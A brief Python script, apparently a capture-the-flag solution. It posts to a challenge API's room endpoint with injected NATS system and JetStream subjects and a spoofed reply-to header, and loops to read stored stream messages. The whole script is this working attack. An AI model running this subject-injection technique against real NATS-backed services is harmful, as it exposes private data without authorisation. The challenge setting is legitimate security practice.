import requests


def send(sub, msg):
    res = requests.post(
        f"https://e263617d-db46-41f9-ae49-a4306d699368.chall.nnsc.tf/api/rooms/{sub}",
        json=msg,
        headers={"x-nats-reply-to": "chat.public"},
    )
    print(res.status_code)
    print(res.json())


send("$SYS.REQ.USER.INFO", {})

# fill in as needed
domain = "LVJXI5HNIPOINZKHOZOBOJSS7GYYE47TECQ35KQV73XLSDTAOJ43Z2QN"
stream = "c6f5e1f89e7c434554c38d15d01df51e"

# send(f"$JS.{domain}.API.STREAM.LIST", {})
for i in range(50):
    send(f"$JS.{domain}.API.STREAM.MSG.GET.{stream}", {"seq": i})
